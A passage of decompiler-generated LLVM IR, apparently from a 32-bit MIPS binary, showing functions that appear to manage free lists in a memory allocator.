dec_label_pc_4063bc:                              ; preds = %dec_label_pc_406398
  %v0_4063b0 = load i32, i32* %s0.global-to-local, align 4
  %v4_4063c0 = inttoptr i32 %v0_4063a8 to i32*
  %v5_4063c0 = call i32 @function_405770(i32* %v4_4063c0, i32 0, i32 %v0_4063b0)
  %v0_4063cc.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_4063cc

dec_label_pc_4063cc:                              ; preds = %dec_label_pc_406398, %dec_label_pc_4063bc
  %v0_4063cc = phi i32 [ 0, %dec_label_pc_406398 ], [ %v0_4063cc.pre, %dec_label_pc_4063bc ]
  ret i32 %v0_4063cc

; uselistorder directives
  uselistorder i32 %v0_4063a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_4063cc, { 1, 0 }
  uselistorder label %dec_label_pc_406398, { 2, 0, 1 }
}

define i32 @function_4063f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4063f0:
  %gp.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %v1_4063f8 = load i32, i32* @t9, align 4
  %v2_4063f8 = add i32 %v1_4063f8, 308672
  store i32 %v2_4063f8, i32* %gp.global-to-local, align 4
  %v0_406400 = load i32, i32* @ra, align 4
  %v0_406404 = load i32, i32* @s2, align 4
  %v0_406408 = load i32, i32* @s1, align 4
  %v0_40640c = load i32, i32* @s0, align 4
  %v1_406414 = icmp eq i32 %arg1, 0
  br i1 %v1_406414, label %dec_label_pc_406564, label %dec_label_pc_406418

dec_label_pc_406418:                              ; preds = %dec_label_pc_4063f0
  %v3_406420 = load i32, i32* bitcast (i32** @global_var_449bf8.200 to i32*), align 4
  %v1_406424 = add i32 %arg1, -4
  %v2_406424 = inttoptr i32 %v1_406424 to i32*
  %v3_406424 = load i32, i32* %v2_406424, align 4
  store i32 %v3_406424, i32* @s1, align 4
  store i32 %v1_406424, i32* @s0, align 4
  %v4_406428 = call i32 @function_406da4(i32 %v3_406420)
  store i32 %v4_406428, i32* @v0, align 4
  store i32 %v2_4063f8, i32* %gp.global-to-local, align 4
  %v3_406438 = load i32, i32* @global_var_449c20.210, align 4
  store i32 %v3_406438, i32* @t9, align 4
  %v3_40643c = load i32, i32* bitcast (i32*** @global_var_449be0.204 to i32*), align 4
  %v0_406440 = load i32, i32* @s0, align 4
  %v1_406444 = load i32, i32* @s1, align 4
  %tmp9 = inttoptr i32 %v3_40643c to i32*
  %v7_406444 = call i32 @function_406688(i32* %tmp9, i32 %v0_406440, i32 %v1_406444)
  store i32 %v2_4063f8, i32* %gp.global-to-local, align 4
  %v1_406450 = inttoptr i32 %v7_406444 to i32*
  %v2_406450 = load i32, i32* %v1_406450, align 4
  store i32 %v2_406450, i32* %s2.global-to-local, align 4
  store i32 %v7_406444, i32* @s0, align 4
  %v3_406458 = load i32, i32* @global_var_449ad0, align 4
  %v1_406468 = mul i32 %v3_406458, 8
  %v2_40646c = icmp ult i32 %v2_406450, %v1_406468
  br i1 %v2_40646c, label %dec_label_pc_4064c4, label %dec_label_pc_406474

dec_label_pc_406474:                              ; preds = %dec_label_pc_406418
  %v3_40647c = load i32, i32* bitcast (i32** @global_var_449af4.208 to i32*), align 4
  %v2_406480 = add i32 %v7_406444, 12
  store i32 %v2_406480, i32* @s1, align 4
  %v4_406480 = call i32 @function_406da4(i32 %v3_40647c)
  store i32 %v2_4063f8, i32* %gp.global-to-local, align 4
  %v3_406490 = load i32, i32* @global_var_449c38.209, align 4
  store i32 %v3_406490, i32* @t9, align 4
  %v2_406498 = call i32 @function_407a20(i32 0)
  store i32 %v2_4063f8, i32* %gp.global-to-local, align 4
  %v0_4064a4 = load i32, i32* @s1, align 4
  %v2_4064a4 = icmp eq i32 %v0_4064a4, %v2_406498
  br i1 %v2_4064a4, label %dec_label_pc_4064e4, label %dec_label_pc_4064a8

dec_label_pc_4064a8:                              ; preds = %dec_label_pc_406474
  %v3_4064b0 = load i32, i32* bitcast (i32** @global_var_449af4.208 to i32*), align 4
  %v2_4064b4 = call i32 @function_406da4(i32 %v3_4064b0)
  store i32 %v2_4063f8, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4064c4

dec_label_pc_4064c4:                              ; preds = %dec_label_pc_406418, %dec_label_pc_4064a8
  %v3_4064c8 = load i32, i32* bitcast (i32** @global_var_449bf8.200 to i32*), align 4
  store i32 %v0_406404, i32* %s2.global-to-local, align 4
  store i32 %v0_406408, i32* @s1, align 4
  store i32 %v0_40640c, i32* @s0, align 4
  %v5_4064dc = call i32 @function_406da4(i32 %v3_4064c8)
  br label %dec_label_pc_4064e4

dec_label_pc_4064e4:                              ; preds = %dec_label_pc_406474, %dec_label_pc_4064c4
  %v0_4064e4 = load i32, i32* @s0, align 4
  %v1_4064e4 = add i32 %v0_4064e4, 4
  %v2_4064e4 = inttoptr i32 %v1_4064e4 to i32*
  %v3_4064e4 = load i32, i32* %v2_4064e4, align 4
  store i32 %v3_4064e4, i32* %v1.global-to-local, align 4
  %v1_4064ec = icmp eq i32 %v3_4064e4, 0
  br i1 %v1_4064ec, label %dec_label_pc_406500, label %dec_label_pc_4064f0

dec_label_pc_4064f0:                              ; preds = %dec_label_pc_4064e4
  %v1_4064f4 = add i32 %v0_4064e4, 8
  %v2_4064f4 = inttoptr i32 %v1_4064f4 to i32*
  %v3_4064f4 = load i32, i32* %v2_4064f4, align 4
  %v2_4064fc = add i32 %v3_4064e4, 8
  %v3_4064fc = inttoptr i32 %v2_4064fc to i32*
  store i32 %v3_4064f4, i32* %v3_4064fc, align 4
  %v0_406500.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_406500

dec_label_pc_406500:                              ; preds = %dec_label_pc_4064e4, %dec_label_pc_4064f0
  %v0_406500 = phi i32 [ %v0_4064e4, %dec_label_pc_4064e4 ], [ %v0_406500.pre, %dec_label_pc_4064f0 ]
  %v1_406500 = add i32 %v0_406500, 8
  %v2_406500 = inttoptr i32 %v1_406500 to i32*
  %v3_406500 = load i32, i32* %v2_406500, align 4
  %v1_406504 = add i32 %v0_406500, 4
  %v2_406504 = inttoptr i32 %v1_406504 to i32*
  %v3_406504 = load i32, i32* %v2_406504, align 4
  store i32 %v3_406504, i32* %v1.global-to-local, align 4
  %v1_406508 = icmp eq i32 %v3_406500, 0
  br i1 %v1_406508, label %dec_label_pc_406518, label %dec_label_pc_40650c

dec_label_pc_40650c:                              ; preds = %dec_label_pc_406500
  %v2_406514 = add i32 %v3_406500, 4
  %v3_406514 = inttoptr i32 %v2_406514 to i32*
  store i32 %v3_406504, i32* %v3_406514, align 4
  %v0_406520.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_406518

dec_label_pc_406518:                              ; preds = %dec_label_pc_406500, %dec_label_pc_40650c
  %v0_406520 = phi i32 [ %v3_406504, %dec_label_pc_406500 ], [ %v0_406520.pre, %dec_label_pc_40650c ]
  %v0_406518 = load i32, i32* %gp.global-to-local, align 4
  %v1_406518 = add i32 %v0_406518, -32208
  %v2_406518 = inttoptr i32 %v1_406518 to i32*
  %v3_406518 = load i32, i32* %v2_406518, align 4
  %v2_406520 = inttoptr i32 %v3_406518 to i32*
  store i32 %v0_406520, i32* %v2_406520, align 4
  %v0_406524 = load i32, i32* %gp.global-to-local, align 4
  %v1_406524 = add i32 %v0_406524, -32264
  %v2_406524 = inttoptr i32 %v1_406524 to i32*
  %v3_406524 = load i32, i32* %v2_406524, align 4
  call void @__pseudo_call(i32 %v3_406524)
  store i32 %v2_4063f8, i32* %gp.global-to-local, align 4
  %v0_406538 = load i32, i32* @s0, align 4
  %v1_406538 = load i32, i32* %s2.global-to-local, align 4
  %v3_40653c = load i32, i32* @global_var_449c38.209, align 4
  store i32 %v3_40653c, i32* @t9, align 4
  %v2_406544 = load i32, i32* @s1, align 4
  %v2_406538 = add i32 %v0_406538, 12
  %v1_406540 = sub i32 %v2_406538, %v1_406538
  %v3_406544 = sub i32 %v1_406540, %v2_406544
  %v5_406544 = call i32 @function_407a20(i32 %v3_406544)
  store i32 %v2_4063f8, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_406564

dec_label_pc_406564:                              ; preds = %dec_label_pc_4063f0, %dec_label_pc_406518
  %.0 = phi i32 [ undef, %dec_label_pc_4063f0 ], [ %v5_406544, %dec_label_pc_406518 ]
  store i32 %v0_406400, i32* @ra, align 4
  store i32 %v0_406404, i32* @s2, align 4
  store i32 %v0_406408, i32* @s1, align 4
  store i32 %v0_40640c, i32* @s0, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_406500, { 1, 0 }
  uselistorder i32 %v0_40640c, { 1, 0 }
  uselistorder i32 %v0_406408, { 1, 0 }
  uselistorder i32 %v0_406404, { 1, 0 }
  uselistorder i32 %v2_4063f8, { 3, 2, 6, 5, 4, 1, 0, 7 }
  uselistorder i32* %s2.global-to-local, { 1, 0, 2 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 5, 6, 2, 3, 4, 7, 8, 9 }
  uselistorder i32 (i32)* @function_407a20, { 1, 0, 3, 2 }
  uselistorder i32 256, { 0, 1, 20, 18, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19 }
  uselistorder i32* @s2, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 2, 22, 23, 3, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 4, 47, 48, 49, 50, 51, 0, 52, 53, 54, 55, 56, 1, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 5, 70, 71, 72, 73, 74, 75, 76 }
  uselistorder label %dec_label_pc_406564, { 1, 0 }
  uselistorder label %dec_label_pc_406518, { 1, 0 }
  uselistorder label %dec_label_pc_406500, { 1, 0 }
  uselistorder label %dec_label_pc_4064e4, { 1, 0 }
  uselistorder label %dec_label_pc_4064c4, { 1, 0 }
}

define i32 @function_406580(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406580:
  %a2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %v1_406580 = inttoptr i32 %arg2 to i32*
  %v2_406580 = load i32, i32* %v1_406580, align 4
  store i32 -4, i32* %v1.global-to-local, align 4
  %v1_406588 = add i32 %v2_406580, 3
  %v2_40658c = and i32 %v1_406588, -4
  store i32 %v2_40658c, i32* %a2.global-to-local, align 4
  %v1_406590 = icmp ult i32 %v2_40658c, 12
  %v2_406590 = zext i1 %v1_406590 to i32
  store i32 %v2_406590, i32* %v0.global-to-local, align 4
  %v1_406594 = icmp eq i1 %v1_406590, false
  br i1 %v1_406594, label %dec_label_pc_4065a0, label %dec_label_pc_406598

dec_label_pc_406598:                              ; preds = %dec_label_pc_406580
  store i32 12, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4065a0

dec_label_pc_4065a0:                              ; preds = %dec_label_pc_406580, %dec_label_pc_406598
  %v3_4065c4 = phi i32 [ %v2_40658c, %dec_label_pc_406580 ], [ 12, %dec_label_pc_406598 ]
  %v2_4065a0 = load i32, i32* %arg1, align 4
  store i32 %v2_4065a0, i32* %v1.global-to-local, align 4
  %v3_4065b8 = add i32 %v3_4065c4, 44
  br label %dec_label_pc_4065ac

dec_label_pc_4065ac:                              ; preds = %dec_label_pc_406624, %dec_label_pc_4065a0
  %v0_406624 = phi i32 [ %v3_406624, %dec_label_pc_406624 ], [ %v2_4065a0, %dec_label_pc_4065a0 ]
  %v1_4065ac = inttoptr i32 %v0_406624 to i32*
  %v2_4065ac = load i32, i32* %v1_4065ac, align 4
  store i32 %v2_4065ac, i32* @a3, align 4
  %v2_4065b4 = icmp ult i32 %v2_4065ac, %v3_4065c4
  store i32 %v3_4065b8, i32* %v0.global-to-local, align 4
  br i1 %v2_4065b4, label %dec_label_pc_406624, label %dec_label_pc_4065bc

dec_label_pc_4065bc:                              ; preds = %dec_label_pc_4065ac
  %v2_4065c0 = icmp ult i32 %v2_4065ac, %v3_4065b8
  %v1_4065c4 = icmp eq i1 %v2_4065c0, false
  %v4_4065c4 = sub i32 %v2_4065ac, %v3_4065c4
  store i32 %v4_4065c4, i32* %v0.global-to-local, align 4
  br i1 %v1_4065c4, label %dec_label_pc_406610, label %dec_label_pc_4065c8

dec_label_pc_4065c8:                              ; preds = %dec_label_pc_4065bc
  %v1_4065cc = add i32 %v0_406624, 4
  %v2_4065cc = inttoptr i32 %v1_4065cc to i32*
  %v3_4065cc = load i32, i32* %v2_4065cc, align 4
  store i32 %v3_4065cc, i32* %a2.global-to-local, align 4
  %v1_4065d4 = icmp eq i32 %v3_4065cc, 0
  br i1 %v1_4065d4, label %dec_label_pc_4065e8, label %dec_label_pc_4065d8

dec_label_pc_4065d8:                              ; preds = %dec_label_pc_4065c8
  %v1_4065dc = add i32 %v0_406624, 8
  %v2_4065dc = inttoptr i32 %v1_4065dc to i32*
  %v3_4065dc = load i32, i32* %v2_4065dc, align 4
  store i32 %v3_4065dc, i32* %v0.global-to-local, align 4
  %v2_4065e4 = add i32 %v3_4065cc, 8
  %v3_4065e4 = inttoptr i32 %v2_4065e4 to i32*
  store i32 %v3_4065dc, i32* %v3_4065e4, align 4
  %v0_4065e8.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4065e8

dec_label_pc_4065e8:                              ; preds = %dec_label_pc_4065c8, %dec_label_pc_4065d8
  %v0_4065e8 = phi i32 [ %v0_406624, %dec_label_pc_4065c8 ], [ %v0_4065e8.pre, %dec_label_pc_4065d8 ]
  %v1_4065e8 = add i32 %v0_4065e8, 8
  %v2_4065e8 = inttoptr i32 %v1_4065e8 to i32*
  %v3_4065e8 = load i32, i32* %v2_4065e8, align 4
  store i32 %v3_4065e8, i32* %v0.global-to-local, align 4
  %v1_4065ec = add i32 %v0_4065e8, 4
  %v2_4065ec = inttoptr i32 %v1_4065ec to i32*
  %v3_4065ec = load i32, i32* %v2_4065ec, align 4
  store i32 %v3_4065ec, i32* %t0.global-to-local, align 4
  %v1_4065f0 = icmp eq i32 %v3_4065e8, 0
  br i1 %v1_4065f0, label %dec_label_pc_406604, label %dec_label_pc_4065f4

dec_label_pc_4065f4:                              ; preds = %dec_label_pc_4065e8
  %v0_4065f8 = load i32, i32* @a3, align 4
  store i32 %v0_4065f8, i32* %a2.global-to-local, align 4
  %v2_406600 = add i32 %v3_4065e8, 4
  %v3_406600 = inttoptr i32 %v2_406600 to i32*
  store i32 %v3_4065ec, i32* %v3_406600, align 4
  %v0_40660c.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_406604

dec_label_pc_406604:                              ; preds = %dec_label_pc_4065e8, %dec_label_pc_4065f4
  %v0_40660c = phi i32 [ %v3_4065ec, %dec_label_pc_4065e8 ], [ %v0_40660c.pre, %dec_label_pc_4065f4 ]
  %v0_406604 = load i32, i32* @a3, align 4
  store i32 %v0_406604, i32* %a2.global-to-local, align 4
  store i32 %v0_40660c, i32* %arg1, align 4
  %v0_406610.pre = load i32, i32* %v0.global-to-local, align 4
  %v1_406610.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_406610

dec_label_pc_406610:                              ; preds = %dec_label_pc_4065bc, %dec_label_pc_406604
  %v1_406610 = phi i32 [ %v0_406624, %dec_label_pc_4065bc ], [ %v1_406610.pre, %dec_label_pc_406604 ]
  %v0_406610 = phi i32 [ %v4_4065c4, %dec_label_pc_4065bc ], [ %v0_406610.pre, %dec_label_pc_406604 ]
  %v2_406610 = inttoptr i32 %v1_406610 to i32*
  store i32 %v0_406610, i32* %v2_406610, align 4
  %v0_406614 = load i32, i32* %v1.global-to-local, align 4
  %v1_406614 = load i32, i32* @a3, align 4
  %v2_406614 = sub i32 %v0_406614, %v1_406614
  %v1_406618 = add i32 %v2_406614, 12
  store i32 %v1_406618, i32* %v0.global-to-local, align 4
  %v1_40661c = load i32, i32* %a2.global-to-local, align 4
  store i32 %v1_40661c, i32* %v1_406580, align 4
  ret i32 %v1_406618

dec_label_pc_406624:                              ; preds = %dec_label_pc_4065ac
  %v1_406624 = add i32 %v0_406624, 4
  %v2_406624 = inttoptr i32 %v1_406624 to i32*
  %v3_406624 = load i32, i32* %v2_406624, align 4
  store i32 %v3_406624, i32* %v1.global-to-local, align 4
  %v1_40662c = icmp eq i32 %v3_406624, 0
  store i32 0, i32* %v0.global-to-local, align 4
  br i1 %v1_40662c, label %dec_label_pc_406630, label %dec_label_pc_4065ac

dec_label_pc_406630:                              ; preds = %dec_label_pc_406624
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_406624, { 1, 2, 0 }
  uselistorder i32 %v0_4065e8, { 1, 0 }
  uselistorder i32 %v2_4065ac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_406624, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v3_4065c4, { 2, 1, 0 }
  uselistorder i32* %v1.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %a2.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder label %dec_label_pc_406610, { 1, 0 }
  uselistorder label %dec_label_pc_406604, { 1, 0 }
  uselistorder label %dec_label_pc_4065e8, { 1, 0 }
  uselistorder label %dec_label_pc_4065a0, { 1, 0 }
}

define i32 @function_406640(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_406640:
  %v2_406640 = add i32 %arg2, 4
  %v3_406640 = inttoptr i32 %v2_406640 to i32*
  store i32 %arg4, i32* %v3_406640, align 4
  %v1_406644 = icmp eq i32 %arg3, 0
  %v4_406644 = add i32 %arg2, 8
  %v5_406644 = inttoptr i32 %v4_406644 to i32*
  store i32 %arg3, i32* %v5_406644, align 4
  br i1 %v1_406644, label %dec_label_pc_406654, label %dec_label_pc_406648

dec_label_pc_406648:                              ; preds = %dec_label_pc_406640
  %v2_406650 = add i32 %arg3, 4
  %v3_406650 = inttoptr i32 %v2_406650 to i32*
  store i32 %arg2, i32* %v3_406650, align 4
  br label %dec_label_pc_406654

dec_label_pc_406654:                              ; preds = %dec_label_pc_406640, %dec_label_pc_406648
  store i32 %arg2, i32* %arg1, align 4
  %v1_406658 = icmp eq i32 %arg4, 0
  br i1 %v1_406658, label %dec_label_pc_406664, label %dec_label_pc_40665c

dec_label_pc_40665c:                              ; preds = %dec_label_pc_406654
  %v2_406660 = add i32 %arg4, 8
  %v3_406660 = inttoptr i32 %v2_406660 to i32*
  store i32 %arg2, i32* %v3_406660, align 4
  br label %dec_label_pc_406664

dec_label_pc_406664:                              ; preds = %dec_label_pc_406654, %dec_label_pc_40665c
  %v1_406664 = load i32, i32* @v0, align 4
  ret i32 %v1_406664

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_406664, { 1, 0 }
  uselistorder label %dec_label_pc_406654, { 1, 0 }
}

define i32 @function_40666c(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40666c:
  %v1_40666c = icmp eq i32 %arg3, 0
  br i1 %v1_40666c, label %dec_label_pc_40667c, label %dec_label_pc_406670

dec_label_pc_406670:                              ; preds = %dec_label_pc_40666c
  %v2_406678 = add i32 %arg3, 4
  %v3_406678 = inttoptr i32 %v2_406678 to i32*
  store i32 %arg2, i32* %v3_406678, align 4
  br label %dec_label_pc_40667c

dec_label_pc_40667c:                              ; preds = %dec_label_pc_40666c, %dec_label_pc_406670
  store i32 %arg2, i32* %arg1, align 4
  %v3_406680 = add i32 %arg2, 8
  %v4_406680 = inttoptr i32 %v3_406680 to i32*
  store i32 %arg3, i32* %v4_406680, align 4
  %v5_406680 = load i32, i32* @v0, align 4
  ret i32 %v5_406680

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_40667c, { 1, 0 }
}

define i32 @function_406688(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406688:
  %a2.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t1.global-to-local = alloca i32, align 4
  %t9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %a2.global-to-local, align 4
  %v2_4066ac = load i32, i32* %arg1, align 4
  store i32 %v2_4066ac, i32* %s0.global-to-local, align 4
  %v1_4066b0 = load i32, i32* %a2.global-to-local, align 4
  %v2_4066b0 = add i32 %v1_4066b0, %arg2
  store i32 %v2_4066b0, i32* %t0.global-to-local, align 4
  store i32 0, i32* %t1.global-to-local, align 4
  %.old = load i32, i32* @v0, align 4
  %v1_4066bc.old = icmp eq i32 %.old, 0
  br i1 %v1_4066bc.old, label %dec_label_pc_4066e4, label %dec_label_pc_4066c0

dec_label_pc_4066c0:                              ; preds = %dec_label_pc_406688, %dec_label_pc_4066c0
  %v0_4066c4 = phi i32 [ %v3_4066c8, %dec_label_pc_4066c0 ], [ %v2_4066ac, %dec_label_pc_406688 ]
  store i32 %v0_4066c4, i32* %t1.global-to-local, align 4
  %v1_4066c8 = add i32 %v0_4066c4, 4
  %v2_4066c8 = inttoptr i32 %v1_4066c8 to i32*
  %v3_4066c8 = load i32, i32* %v2_4066c8, align 4
  store i32 %v3_4066c8, i32* %s0.global-to-local, align 4
  %v1_4066d0 = add i32 %v3_4066c8, 12
  %v1_4066d4 = icmp eq i32 %v3_4066c8, 0
  %v4_4066d4 = icmp ult i32 %v1_4066d0, %arg2
  %v1_4066bc = icmp eq i1 %v4_4066d4, false
  %or.cond = or i1 %v1_4066d4, %v1_4066bc
  br i1 %or.cond, label %dec_label_pc_4066e4, label %dec_label_pc_4066c0

dec_label_pc_4066e4:                              ; preds = %dec_label_pc_4066c0, %dec_label_pc_406688
  %v0_40671c = phi i32 [ 0, %dec_label_pc_406688 ], [ %v0_4066c4, %dec_label_pc_4066c0 ]
  %v0_406724 = phi i32 [ %v2_4066ac, %dec_label_pc_406688 ], [ %v3_4066c8, %dec_label_pc_4066c0 ]
  %v1_4066e4 = inttoptr i32 %v0_406724 to i32*
  %v2_4066e4 = load i32, i32* %v1_4066e4, align 4
  %v2_4066ec = sub i32 %v0_406724, %v2_4066e4
  %v1_4066f0 = add i32 %v2_4066ec, 12
  %v2_4066f4 = icmp ult i32 %v2_4066b0, %v1_4066f0
  br i1 %v2_4066f4, label %dec_label_pc_4067b4, label %dec_label_pc_4066fc

dec_label_pc_4066fc:                              ; preds = %dec_label_pc_4066e4
  %v2_406700 = icmp eq i32 %v1_4066f0, %v2_4066b0
  %v5_406700 = add i32 %v2_4066e4, %v1_4066b0
  store i32 %v5_406700, i32* %s2.global-to-local, align 4
  br i1 %v2_406700, label %dec_label_pc_406704, label %dec_label_pc_40673c

dec_label_pc_406704:                              ; preds = %dec_label_pc_4066fc
  %v1_406708 = icmp ne i32 %v0_40671c, 0
  %v3_406708 = add i32 %v0_40671c, 12
  %v2_406710 = icmp eq i32 %v3_406708, %arg2
  %or.cond1 = and i1 %v1_406708, %v2_406710
  br i1 %or.cond1, label %dec_label_pc_406714, label %dec_label_pc_4067a8

dec_label_pc_406714:                              ; preds = %dec_label_pc_406704
  %v3_406718 = load i32, i32* @global_var_4499d0.88, align 4
  store i32 %v3_406718, i32* %t9.global-to-local, align 4
  %v1_40671c = inttoptr i32 %v0_40671c to i32*
  %v2_40671c = load i32, i32* %v1_40671c, align 4
  %v1_406720 = add i32 %v0_40671c, 8
  %v2_406720 = inttoptr i32 %v1_406720 to i32*
  %v3_406720 = load i32, i32* %v2_406720, align 4
  store i32 %v3_406720, i32* %a2.global-to-local, align 4
  %v1_406728 = add i32 %v3_406718, 26220
  store i32 %v1_406728, i32* %t9.global-to-local, align 4
  %v3_40672c = add i32 %v2_40671c, %v5_406700
  store i32 %v3_40672c, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406728)
  %v0_40673c.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_40673c

dec_label_pc_40673c:                              ; preds = %dec_label_pc_4066fc, %dec_label_pc_406714
  %v0_40673c = phi i32 [ %v0_406724, %dec_label_pc_4066fc ], [ %v0_40673c.pre, %dec_label_pc_406714 ]
  %v1_40673c = add i32 %v0_40673c, 4
  %v2_40673c = inttoptr i32 %v1_40673c to i32*
  %v3_40673c = load i32, i32* %v2_40673c, align 4
  store i32 %v3_40673c, i32* %s1.global-to-local, align 4
  %v1_406744 = icmp eq i32 %v3_40673c, 0
  br i1 %v1_406744, label %dec_label_pc_406788, label %dec_label_pc_406748

dec_label_pc_406748:                              ; preds = %dec_label_pc_40673c
  %v1_40674c = inttoptr i32 %v3_40673c to i32*
  %v2_40674c = load i32, i32* %v1_40674c, align 4
  %v2_406754 = sub i32 %v3_40673c, %v2_40674c
  %v1_406758 = add i32 %v2_406754, 12
  %v0_40675c = load i32, i32* %t0.global-to-local, align 4
  %v2_40675c = icmp eq i32 %v0_40675c, %v1_406758
  br i1 %v2_40675c, label %dec_label_pc_406760, label %dec_label_pc_406788

dec_label_pc_406760:                              ; preds = %dec_label_pc_406748
  %v3_406764 = load i32, i32* @global_var_4499d0.88, align 4
  %v0_406768 = load i32, i32* %t1.global-to-local, align 4
  store i32 %v0_406768, i32* %a2.global-to-local, align 4
  %v1_406770 = add i32 %v3_406764, 26220
  store i32 %v1_406770, i32* %t9.global-to-local, align 4
  %v1_406774 = load i32, i32* %s2.global-to-local, align 4
  %v3_406774 = add i32 %v1_406774, %v2_40674c
  store i32 %v3_406774, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406770)
  %v0_406784 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_406784, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406788

dec_label_pc_406788:                              ; preds = %dec_label_pc_406748, %dec_label_pc_40673c, %dec_label_pc_406760
  %v0_40678c = phi i32 [ %v0_40673c, %dec_label_pc_406748 ], [ %v0_40673c, %dec_label_pc_40673c ], [ %v0_406784, %dec_label_pc_406760 ]
  %v3_406788 = load i32, i32* @global_var_4499d0.88, align 4
  %v1_40678c = load i32, i32* %a2.global-to-local, align 4
  %v2_40678c = add i32 %v1_40678c, %v0_40678c
  store i32 %v2_40678c, i32* %s0.global-to-local, align 4
  %v0_406794 = load i32, i32* %t1.global-to-local, align 4
  store i32 %v0_406794, i32* %a2.global-to-local, align 4
  %v1_406798 = add i32 %v3_406788, 26176
  store i32 %v1_406798, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406798)
  %v0_4067b0.pre = load i32, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_4067a8

dec_label_pc_4067a8:                              ; preds = %dec_label_pc_406704, %dec_label_pc_406788
  %v0_4067b0 = phi i32 [ %v5_406700, %dec_label_pc_406704 ], [ %v0_4067b0.pre, %dec_label_pc_406788 ]
  %v0_4067a8 = phi i32 [ %v0_406724, %dec_label_pc_406704 ], [ %v2_40678c, %dec_label_pc_406788 ]
  store i32 %v0_4067a8, i32* %s1.global-to-local, align 4
  %v2_4067b0 = inttoptr i32 %v0_4067a8 to i32*
  store i32 %v0_4067b0, i32* %v2_4067b0, align 4
  %v0_4067b8.pre = load i32, i32* %t0.global-to-local, align 4
  %v0_4067bc.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4067b4

dec_label_pc_4067b4:                              ; preds = %dec_label_pc_4066e4, %dec_label_pc_4067a8
  %v0_4067bc = phi i32 [ %v1_4066b0, %dec_label_pc_4066e4 ], [ %v0_4067bc.pre, %dec_label_pc_4067a8 ]
  %v0_4067b8 = phi i32 [ %v2_4066b0, %dec_label_pc_4066e4 ], [ %v0_4067b8.pre, %dec_label_pc_4067a8 ]
  %v3_4067b4 = load i32, i32* @global_var_4499d0.88, align 4
  store i32 %v3_4067b4, i32* %t9.global-to-local, align 4
  %v1_4067b8 = add i32 %v0_4067b8, -12
  store i32 %v1_4067b8, i32* %s1.global-to-local, align 4
  %v3_4067bc = inttoptr i32 %v1_4067b8 to i32*
  store i32 %v0_4067bc, i32* %v3_4067bc, align 4
  %v0_4067c0 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_4067c0, i32* @a3, align 4
  %v0_4067c4 = load i32, i32* %t1.global-to-local, align 4
  store i32 %v0_4067c4, i32* %a2.global-to-local, align 4
  %v0_4067c8 = load i32, i32* %t9.global-to-local, align 4
  %v1_4067c8 = add i32 %v0_4067c8, 26176
  store i32 %v1_4067c8, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_4067c8)
  %v0_4067d8 = load i32, i32* %s1.global-to-local, align 4
  ret i32 %v0_4067d8

; uselistorder directives
  uselistorder i32 %v0_4067a8, { 1, 0 }
  uselistorder i32 %v3_40673c, { 1, 0, 2, 3 }
  uselistorder i32 %v5_406700, { 1, 0, 2 }
  uselistorder i32 %v0_406724, { 0, 1, 3, 2 }
  uselistorder i32 %v0_40671c, { 1, 0, 3, 2 }
  uselistorder i32 %v3_4066c8, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_4066c4, { 0, 2, 1 }
  uselistorder i32 %v1_4066b0, { 2, 0, 1 }
  uselistorder i32 %v2_4066ac, { 1, 0, 2 }
  uselistorder i32* %t1.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %t0.global-to-local, { 1, 0, 2 }
